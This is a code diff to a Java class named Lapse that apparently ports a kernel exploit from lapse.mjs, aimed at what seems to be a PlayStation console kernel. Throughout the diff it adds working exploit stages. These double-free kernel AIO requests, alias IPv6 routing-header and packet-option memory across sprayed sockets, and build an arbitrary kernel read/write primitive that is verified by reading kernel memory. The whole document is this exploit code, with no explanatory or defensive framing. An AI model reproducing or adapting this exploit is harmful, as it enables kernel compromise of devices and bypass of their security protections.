@@ -62,6 +62,7 @@ public class Lapse extends Thread {
 			BreakASLR      breakASLR      = new BreakASLR();
 			LeakAioEntry   leakAioEntry   = new LeakAioEntry();
 			AliasAioRthdr  aliasAioRthdr  = new AliasAioRthdr();
+			MakeKernelRW   makeKernelRW   = new MakeKernelRW();
 
 			try {
 				// Core setup
@@ -105,13 +106,22 @@ public class Lapse extends Thread {
 				leakAioEntry.run();
 
 				// Double-free SceKernelAioRWRequest/alias with evf
+				aliasAioRthdr.inoutSockets = aliasRthdrs.outSockets;
 				aliasAioRthdr.inEvf = aliasEvfRthdr.outEvf;
 				aliasAioRthdr.inSocket = aliasEvfRthdr.outSocket;
 				aliasAioRthdr.inAioEntryAddr = leakAioEntry.outAioEntryAddr;
 				aliasAioRthdr.inKernelHeapAddr = breakASLR.outKernelHeapAddr;
+				aliasAioRthdr.inAioTargetId = leakAioEntry.outAioTargetId;
 				aliasAioRthdr.run();
 
 				// Get arbitrary kernel read/write
+				makeKernelRW.inoutSockets = aliasAioRthdr.inoutSockets;
+				makeKernelRW.inAioEntryAddr = leakAioEntry.outAioEntryAddr;
+				makeKernelRW.inKernelImageAddr = breakASLR.outKernelImageAddr;
+				makeKernelRW.inSocketA = aliasAioRthdr.outSocketA;
+				makeKernelRW.inSocketB = aliasAioRthdr.outSocketA;
+				makeKernelRW.inDirtySocket = aliasAioRthdr.outSocket;
+				makeKernelRW.run();
 
 				// Patch kernel
 
@@ -126,6 +136,9 @@ public class Lapse extends Thread {
 				deletePrevReqs.cleanup();
 				aliasEvfRthdr .cleanup();
 				breakASLR     .cleanup();
+				leakAioEntry  .cleanup();
+				aliasAioRthdr .cleanup();
+				makeKernelRW  .cleanup();
 			}
 		} catch (Throwable e) {
 			Console.log(e);
@@ -490,9 +503,9 @@ public class Lapse extends Thread {
 		private final int RTHDR_SIZE = (RTHDR_LEN + 1) << 3;
 		private Buffer rthdrTemplate = new Buffer(RTHDR_SIZE);
 
+		/** Sockets array that every step reuses, sds in lapse.mjs */
+		public Socket outSockets[] = null;
 		private final int NUM_SOCKETS = 64; // num_sds in lapse.mjs
-		private Socket sockets[] = null;
-		private int socketsUsed = 0;
 
 		public AliasRthdrs() {
 			// IPV6_RTHDR (routing header) options struct for setsockopt, build_rthdr in lapse.mjs
@@ -504,10 +517,9 @@ public class Lapse extends Thread {
 
 			// Allocated here because DoubleFree induces a PANIC state that AliasRthdrs.run needs
 			// to RESTORE, and creating sockets involves syscalls and kernel memory allocation
-			sockets = new Socket[NUM_SOCKETS];
-			socketsUsed = NUM_SOCKETS;
-			for (int i = 0; i < sockets.length; i++) {
-				sockets[i] = k.new SocketUDP6();
+			outSockets = new Socket[NUM_SOCKETS];
+			for (int i = 0; i < outSockets.length; i++) {
+				outSockets[i] = k.new SocketUDP6();
 			}
 		}
 
@@ -519,7 +531,7 @@ public class Lapse extends Thread {
 			for (int aliasAttempt = 0; aliasAttempt < NUM_ALIAS_ATTEMPTS; aliasAttempt++) {
 				log("AliasRthdr: attempt " + aliasAttempt);
 
-				for (int i = 0; i < sockets.length; i++) {
+				for (int i = 0; i < outSockets.length; i++) {
 					rthdrTemplate.putInt(MARKER_OFFSET, i);
 
 					// FIXME: I don't really get this bit of the exploit. lapse.mjs has these
@@ -528,19 +540,18 @@ public class Lapse extends Thread {
 					// RESTORE comment correspond to the PANIC comment on this one?
 					// RESTORE: Reclaim double-freed memory with harmless data(?)
 					// PANIC: 0x80 malloc zone pointers aliased(?)
-					sockets[i].setRthdr(rthdrTemplate);
+					outSockets[i].setRthdr(rthdrTemplate);
 				}
 
 				for (int i = 0; i < NUM_SOCKETS; i++) {
-					sockets[i].getRthdr(buf);
+					outSockets[i].getRthdr(buf);
 					int m = buf.getInt(MARKER_OFFSET);
 					if (m == i) {
 						// No corruption occurred for this rthdr, can ignore it
 						continue;
 					}
-					outSocketA = sockets[i]; sockets[i] = null;
-					outSocketB = sockets[m]; sockets[m] = null;
-					socketsUsed -= 2;
+					outSocketA = outSockets[i]; outSockets[i] = k.new SocketUDP6();
+					outSocketB = outSockets[m]; outSockets[m] = k.new SocketUDP6();
 					break; // done
 				}
 
@@ -552,23 +563,14 @@ public class Lapse extends Thread {
 			}
 
 			log("-> aliased rthdrs on sockets " + outSocketA.fd + "/" + outSocketB.fd);
-			cleanupLeftoverSockets();
 		}
 
 		public void cleanup() {
-			cleanupLeftoverSockets();
 			outSocketA.close();
 			outSocketB.close();
-		}
-
-		private void cleanupLeftoverSockets() {
-			if (sockets == null) return;
-			log("AliasRthdrs: closing " + socketsUsed + " leftover sockets");
-			for (int i = 0; i < sockets.length; i++) {
-				if (sockets[i] == null) continue;
-				sockets[i].close();
+			for (int i = 0; i < outSockets.length; i++) {
+				outSockets[i].close();
 			}
-			sockets = null;
 		}
 	}
 
@@ -730,6 +732,9 @@ public class Lapse extends Thread {
 		public Socket inSocket;
 
 		public long outAioEntryAddr;
+		public AioSubmitIdArray outAioTargetId;
+
+		private AioSubmitIdArray ids = null;
 
 		public void run() throws Throwable {
 			// FIXME: These comments are just copy-pasted from lapse.mjs, fix them up
@@ -745,7 +750,7 @@ public class Lapse extends Thread {
 			final int NUM_HANDLES = 256;
 
 			AioRWRequestArray reqs = k.new AioRWRequestArray(NUM_ELEMS);
-			AioSubmitIdArray ids = k.new AioSubmitIdArray(NUM_HANDLES * NUM_ELEMS);
+			ids = k.new AioSubmitIdArray(NUM_HANDLES * NUM_ELEMS);
 			reqs.initMinimal();
 
 			// FIXME: Same as in BreakASLR, move to global scope?
@@ -755,8 +760,9 @@ public class Lapse extends Thread {
 			Buffer buf = new Buffer(LEAK_SIZE);
 
 			final int NUM_ATTEMPTS = 20; // FIXME: lapse.mjs does 6
+			int reqs2Offset = 0;
 			for (int attempt = 0; attempt < NUM_ATTEMPTS; attempt++) {
-				Console.log("LeakAioEntry: attempt " + attempt);
+				log("LeakAioEntry: attempt " + attempt);
 
 				inSocket.getRthdr(buf);
 
@@ -832,19 +838,54 @@ public class Lapse extends Thread {
 
 				if (verified) {
 					outAioEntryAddr = buf.address() + offset;
-					Console.log("-> found reqs2 at 0x" + Console.hex(outAioEntryAddr));
+					reqs2Offset = offset;
+					log("-> reqs2 offset " + offset + " addr 0x" + Console.hex(outAioEntryAddr));
 					break;
 				}
+			}
+
+			Console.log("-> looking for target_id");
+
+			for (int i = 0; i < ids.count; i += NUM_ELEMS) {
+				k.aioMultiCancel(ids.slice(i, NUM_ELEMS), null);
+
+				inSocket.getRthdr(buf);
+
+				int state = buf.getInt(reqs2Offset + 0x38);
+				if (state != k.AIO_STATE_ABORTED) {
+					continue; // not the one we're looking for
+				}
+
+				Console.log("-> found target_id in batch " + i / NUM_ELEMS);
+				outAioTargetId = ids.slice(i, 1);
+				ids.set(i, 0); // prevent it from getting deleted
+				break;
+			}
+
+			cleanup();
+		}
+
+		public void cleanup() {
+			if (ids != null) {
+				k.aioUtilBatchCancelPollDelete(ids);
 			}
 		}
 	}
 
 	class AliasAioRthdr extends Phase {
+		/** Sockets array that every step reuses, sds in lapse.mjs */
+		public Socket inoutSockets[] = null;
+
 		public Evf inEvf;
 		public Socket inSocket;
 		public long inKernelHeapAddr;
 		public long inKernelImageAddr;
 		public long inAioEntryAddr;
+		public AioSubmitIdArray inAioTargetId;
+
+		public Socket outSocket;  // sd in lapse.mjs, unrelated to pair(?)
+		public Socket outSocketA; // sd_pair[0] in lapse.mjs
+		public Socket outSocketB; // sd_pair[1] in lapse.mjs
 
 		public void run() throws Throwable {
 			final int MAX_LEAK_LEN = (0xff + 1) << 3; // FIXME: why?
@@ -860,7 +901,7 @@ public class Lapse extends Thread {
 			boolean successful = false;
 
 			for (int attempt = 0; attempt < NUM_ATTEMPTS; attempt++) {
-				Console.log("AliasAioRthdr: attempt " + attempt);
+				log("AliasAioRthdr: overwrite rthdr with AIO queue entry: attempt " + attempt);
 
 				// spray_aio
 				for (int i = 0; i < NUM_BATCHES; i++) {
@@ -870,7 +911,7 @@ public class Lapse extends Thread {
 
 				int written = inSocket.getRthdr(buf);
 				if (written == 8 && buf.getInt(0) == k.AIO_CMD_READ) {
-					Console.log("-> aliased");
+					log("-> aliased");
 					successful = true;
 					k.aioUtilBatchCancel(ids, null);
 					break;
@@ -880,7 +921,7 @@ public class Lapse extends Thread {
 			}
 
 			if (!successful) {
-				throw new Exception("AliasAioRthdr: failed");
+				throw new Exception("Couldn't overwrite rthdr with AIO queue entry");
 			}
 
 			final int MALLOC_SIZE = 0x80;
@@ -920,9 +961,265 @@ public class Lapse extends Thread {
 			reqs3.putInt(0x28, 0x67b0000); // .ar3_lock.lock_object_lo_flags
 			reqs3.putLong(0x38, 1);        // .ar3_lock.lk_lock = LK_UNLOCKED
 
-			AioSubmitIdArray states = k.new AioSubmitIdArray(NUM_ELEMS);
+			outSocket = null;
+			AioSubmitIdArray reqId = null;
+			for (int attempt = 0; attempt < NUM_ATTEMPTS; attempt++) {
+				log("AliasAioRthdr: overwrite AIO queue entry with rthdr: attempt " + attempt);
+				for (int i = 0; i < inoutSockets.length; i++) {
+					inoutSockets[i].setRthdr(reqs2.slice(0, RTHDR_SIZE));
+				}
 
-			// FIXME: Just keep going...
+				AioErrorArray states = k.new AioErrorArray(NUM_ELEMS);
+
+				int aioIdx = -1;
+				for (int i = 0; i < NUM_BATCHES; i++) {
+					for (int j = 0; j < states.count; j++) {
+						states.set(j, -1);
+					}
+					k.aioMultiCancel(ids.slice((i * NUM_ELEMS) << 2, NUM_ELEMS), null);
+					int reqIdx = -1;
+					for (int j = 0; j < states.count; j++) {
+						if (states.get(j).get() == k.AIO_STATE_COMPLETED) {
+							reqIdx = j;
+							break;
+						}
+					}
+					if (reqIdx == -1) {
+						continue; // check next batch
+					}
+					log("-> found req_id " + reqIdx + " in batch " + i);
+					aioIdx = i * NUM_ELEMS + reqIdx;
+					break;
+				}
+				if (aioIdx == -1) {
+					continue; // try again
+				}
+
+				reqId = k.new AioSubmitIdArray(1);
+				reqId.set(0, ids.get(aioIdx).get());
+				ids.set(aioIdx, 0); // keep it from getting deleted in the next step
+
+				// set .ar3_done to 1
+				k.aioMultiPoll(reqId, states);
+				int rid = reqId.get(0).get(), rst = states.get(0).get();
+				log("-> aio_multi_poll " + rid + " => 0x" + Integer.toHexString(rst));
+
+				for (int i = 0; i < inoutSockets.length; i++) {
+					Socket socket = inoutSockets[i];
+					socket.getRthdr(reqs2);
+					byte done = reqs2.getByte(REQS3_OFFSET + 0xc);
+					if (done != 0) {
+						log("-> read reqs2 via getsockopt on socket i=" + i + " fd=" + socket.fd);
+						log(hexdump(reqs2, "-> "));
+						outSocket = socket;
+						inoutSockets[i] = k.new SocketUDP6();
+						break;
+					}
+				}
+				if (outSocket != null) {
+					break;
+				}
+			}
+			if (outSocket == null) {
+				throw new Exception("Couldn't find sd that overwrote AIO queue entry");
+			}
+
+			k.aioUtilBatchCancelPollDelete(ids); // delete everything except reqId
+
+			// Enable deletion of targetId from last step
+			AioErrorArray state = k.new AioErrorArray(1);
+			k.aioMultiPoll(inAioTargetId, state);
+			log("-> target_id state: " + state.get(0));
+
+			AioErrorArray errors = k.new AioErrorArray(2);
+			AioSubmitIdArray targetIds = k.new AioSubmitIdArray(2);
+			targetIds.set(0, reqId.get(0).get());
+			targetIds.set(1, inAioTargetId.get(0).get());
+
+			// PANIC: double free on the 0x100 malloc zone. important kernel data may alias
+			log("-> aio_multi_delete req_id " + targetIds.get(0) + " target_id " + targetIds.get(1));
+			k.aioMultiDelete(targetIds, errors);
+
+			// We reclaim first since the sanity checking here is longer which makes it more likely
+			// that we have another process claim the memory
+			// lapse.mjs calls this block make_aliased_pktopts
+			// RESTORE: double freed memory has been reclaimed with harmless data
+			// PANIC: 0x100 malloc zone pointers aliased
+
+			// NOTE: Probably shouldn't log anything here since we're in a PANIC state?
+			enableLogging = false;
+
+			int NUM_PKTOPT_ALIAS_ATTEMPTS = 50; // FIXME: 10 in lapse.mjs
+			Socket sockets[] = inoutSockets;
+			for (int attempt = 0; attempt < NUM_PKTOPT_ALIAS_ATTEMPTS; attempt++) {
+				log("-> make_aliased_pktopts attempt " + attempt);
+				for (int i = 0; i < sockets.length; i++) {
+					if (sockets[i] == null) continue;
+					sockets[i].setOption(k.IPPROTO_IPV6, k.IPV6_2292PKTOPTIONS, new Buffer(0, 0));
+				}
+				Buffer tclass = new Buffer(4);
+				for (int i = 0; i < sockets.length; i++) {
+					if (sockets[i] == null) continue;
+					tclass.putInt(0, i); // marker
+					sockets[i].setOption(k.IPPROTO_IPV6, k.IPV6_TCLASS, tclass);
+				}
+				for (int i = 0; i < sockets.length; i++) {
+					if (sockets[i] == null) continue;
+					sockets[i].getOption(k.IPPROTO_IPV6, k.IPV6_TCLASS, tclass);
+					int m = tclass.getInt(0); // marker
+					if (m != i) {
+						outSocketA = sockets[i]; sockets[i] = k.new SocketUDP6();
+						outSocketB = sockets[m]; sockets[m] = k.new SocketUDP6();
+						enableLogging = true; // ehhh...
+						log("-> found pair with fds " + outSocketA.fd + "/" + outSocketB.fd);
+						break;
+					}
+				}
+				if (outSocketA != null) {
+					break;
+				}
+			}
+
+			enableLogging = true;
+			log("-> aio_multi_delete errors: " + errors);
+
+			AioErrorArray states = k.new AioErrorArray(2);
+			k.aioMultiPoll(targetIds, states);
+			log("-> target_id states: " + states);
+
+			if (states.get(0).get() != k.SCE_KERNEL_ERROR_ESRCH) {
+				throw new Exception("Bad delete of corrupt AIO request");
+			}
+
+			if (errors.get(0).get() != 0 || errors.get(0).get() != errors.get(1).get()) {
+				throw new Exception("Bad delete of ID pair");
+			}
+
+			if (outSocketA == null) {
+				throw new Exception("Couldn't find aliasing pktopt pair");
+			}
+		}
+	}
+
+	private class MakeKernelRW extends Phase {
+		/** Sockets array that every step reuses, sds in lapse.mjs */
+		public Socket inoutSockets[];
+
+		/** Socket whose rthdr pointer is corrupt, dirty_sd in lapse.mjs */
+		public Socket inDirtySocket;
+
+		/** pktopts_sds[0] in lapse.mjs */
+		public Socket inSocketA;
+
+		/** pktopts_sds[1] in lapse.mjs */
+		public Socket inSocketB;
+
+		/** Double freed 0x100 malloc zone address, k100_addr in lapse.mjs */
+		public long inAioEntryAddr;
+
+		/** Address of the "evf cv" string, kernel_addr in lapse.mjs */
+		public long inKernelImageAddr;
+
+		public void run() throws Throwable {
+			log("MakeKernelRW: constructing arbitrary kernel read/write primitive");
+
+			Socket psd = inSocketA;
+
+			Buffer tclass = new Buffer(4);
+			final int TCLASS_OFFSET = 0xb0; // would be 0xc0 for PS5
+
+			final int MALLOC_SIZE = 0x100;
+			Buffer pktopts = new Buffer(MALLOC_SIZE);
+
+			// IPV6_RTHDR (routing header) options struct for setsockopt, build_rthdr in lapse.mjs
+			// FIXME: Would be nice to have a BufferLike class that mirrors the rthdr structure
+			final int RTHDR_LEN = ((MALLOC_SIZE >> 3) - 1) & ~1;
+			final int RTHDR_SIZE = (RTHDR_LEN + 1) << 3;
+			pktopts.putByte(0, (byte)0);                // ip6r_next
+			pktopts.putByte(1, (byte)RTHDR_LEN);        // ip6r_len
+			pktopts.putByte(2, (byte)0);                // ip6r_type
+			pktopts.putByte(3, (byte)(RTHDR_LEN >> 1)); // ip6r_segleft
+
+			long pktinfoAddr = inKernelImageAddr + 0x10;
+			pktopts.putLong(0x10, pktinfoAddr); // pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo
+
+			log("-> overwrite main pktopts");
+			Socket reclaimSocket = null;
+			inSocketB.close();
+
+			final int NUM_ATTEMPTS = 50; // 10 in lapse.mjs, num_alias
+			for (int attempt = 0; attempt < NUM_ATTEMPTS; attempt++) {
+				for (int i = 0; i < inoutSockets.length; i++) {
+					// if a socket doesn't have a pktopts, setting the rthdr will make
+					// one. the new pktopts might reuse the memory instead of the
+					// rthdr. make sure the sockets already have a pktopts before
+					pktopts.putInt(TCLASS_OFFSET, 0x4141 | (i << 16)); // marker
+					inoutSockets[i].setRthdr(pktopts.slice(0, RTHDR_SIZE));
+				}
+				psd.getOption(k.IPPROTO_IPV6, k.IPV6_TCLASS, tclass);
+				int m = tclass.getInt(0); // marker
+				if ((m & 0xffff) == 0x4141) {
+					log("-> found marker on attempt " + attempt);
+					int idx = m >> 16;
+					reclaimSocket = inoutSockets[idx];
+					inoutSockets[idx] = k.new SocketUDP6(); // FIXME: maybe unsafe?
+					break;
+				}
+			}
+			if (reclaimSocket == null) {
+				throw new Exception("Failed to overwrite main pktopts");
+			}
+
+			log("-> constructing kernel arbitrary read/write primitive");
+			KernelRW krw = new KernelRW(k, psd, pktinfoAddr);
+
+			// Try to read the "evf cv" string from kernel memory
+			long evfCvQword = krw.read64(inKernelImageAddr);
+			String evfCv = api.readString(krw.read.address(), 8);
+			log("-> read from kernel memory: 0x" + Console.hex(evfCvQword) + " '" + evfCv + "'");
+
+			if (!evfCv.equals("evf cv")) {
+				throw new Exception("Kernel arbitrary read/write doesn't work");
+			}
+		}
+	}
+
+	/** Arbitrary kernel read/write primitive instantiated by MakeKernelRW */
+	public static class KernelRW {
+		private LibKernel k;
+		private Buffer pktinfo = new Buffer(0x14);
+		private Socket psd;
+		private Buffer nhop = new Buffer(4);
+
+		/** Buffer containing the last qword read with read64
+		 * FIXME: Only exposed because we have no read8 primitive yet */
+		public Buffer read = new Buffer(8);
+
+		public KernelRW(LibKernel k, Socket psd, long pktinfoAddr) {
+			this.k = k;
+			this.psd = psd;
+			this.pktinfo.putLong(0, pktinfoAddr);
+		}
+
+		public long read64(long addr) {
+			final int LEN = 8;
+			for (int offset = 0; offset < LEN;) {
+				pktinfo.putLong(8, addr + offset); // pktopts.ip6po_nhinfo = addr + offset
+				nhop.putByte(0, (byte)(LEN - offset));
+				psd.setOption(k.IPPROTO_IPV6, k.IPV6_PKTINFO, pktinfo);
+				// FIXME: Make setOption support this usecase
+				long raddr = read.address() + offset;
+				long rplen = nhop.address();
+				k.SYS_getsockopt.call(psd.fd, k.IPPROTO_IPV6, k.IPV6_NEXTHOP, raddr, rplen);
+				int n = nhop.getInt(0); // bytes actually written(?)
+				if (n == 0) {
+					read.putByte(offset, (byte)0); // in case read fails(?)
+					offset += 1;
+				} else {
+					offset += n;
+				}
+			}
+			return read.getLong(0);
 		}
 	}
 
